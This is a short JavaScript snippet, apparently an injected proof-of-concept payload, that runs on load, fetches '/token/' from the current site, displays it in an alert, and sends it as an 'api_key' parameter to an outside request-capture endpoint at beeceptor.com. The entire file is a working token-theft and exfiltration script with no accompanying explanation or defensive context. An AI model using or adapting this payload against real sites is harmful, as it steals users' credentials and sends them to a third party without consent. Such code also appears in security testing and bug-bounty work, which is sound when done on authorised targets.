function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

function UserAction() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
         if (this.readyState == 4 && this.status == 200) {
             var str = this.responseText;
             alert(str);
             var url='https://abhilashs.free.beeceptor.com/?api_key='+str;
			 httpGet(url)
         }
    };
    xhttp.open("GET", "/token/", true);
    xhttp.send();
};
UserAction();
